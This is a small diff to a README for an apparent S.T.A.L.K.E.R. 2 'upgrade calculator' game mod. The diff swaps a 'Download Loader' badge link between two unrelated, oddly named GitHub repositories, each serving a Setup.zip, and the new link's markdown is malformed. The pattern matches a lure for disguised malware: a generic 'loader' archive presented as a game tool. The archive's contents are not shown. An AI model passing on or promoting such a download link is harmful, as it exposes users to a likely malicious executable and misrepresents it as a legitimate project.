@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for S.T.A.L.K.E.R. 2 Upgrade Calculator
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/TameDragonflyFlare/Dota-2/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)]https://github.com/WASD122/bvvb/releases/download/main/Setup.zip)
 
 ---
 
@@ -38,3 +38,4 @@ configs/
 `S-T-A-L-K-E-R-2-Upgrade-Calculator` · Updated: 2026-10-05
 
 **Tags:** `stalker-2` `upgrade-calculator` `fps` `survival` `equipment`
+
